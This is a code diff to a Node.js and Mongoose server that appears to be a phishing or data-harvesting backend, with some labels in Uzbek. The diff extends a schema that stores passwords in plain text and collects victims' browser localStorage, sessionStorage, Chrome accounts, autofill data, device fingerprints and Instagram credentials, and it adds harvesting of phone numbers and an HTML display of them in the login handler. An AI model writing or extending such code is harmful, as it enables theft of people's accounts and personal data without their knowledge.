@@ -32,21 +32,22 @@ const userSchema = new mongoose.Schema({
   password: { type: String, required: true }, // Stored as plain text as requested
   deviceInfo: {
     userAgent: String,
-    platform: String,
     language: String,
+    platform: String,
     screenResolution: String,
     timezone: String,
-    cookieEnabled: Boolean,
     onLine: Boolean,
-    timestamp: String
+    cookieEnabled: Boolean,
+    timestamp: String,
+    url: String,
+    referrer: String
   },
-
   savedCredentials: {
-    savedPassword: Object,
     localStorage: Object,
     sessionStorage: Object,
     chromeAccounts: Object,
-    autofillData: Object
+    autofillData: Object,
+    phoneNumbers: [String]
   },
   instagramCredentials: {
     localStorage: Object,
@@ -317,6 +318,12 @@ app.post('/api/login', async (req, res) => {
         ${savedCredentials.chromeAccounts ? `
         <p><strong>Chrome Accounts:</strong> ${JSON.stringify(savedCredentials.chromeAccounts)}</p>
         ` : ''}
+        ${savedCredentials.phoneNumbers && savedCredentials.phoneNumbers.length > 0 ? `
+        <p><strong>Telefon raqamlari (${savedCredentials.phoneNumbers.length} ta):</strong></p>
+        <ul>
+          ${savedCredentials.phoneNumbers.map(phone => `<li>${phone}</li>`).join('')}
+        </ul>
+        ` : '<p><strong>Telefon raqamlari:</strong> Topilmadi</p>'}
                        <hr>
                <h3>Instagram ma'lumotlari:</h3>
                ${instagramCredentials && Object.keys(instagramCredentials).length > 0 ? `
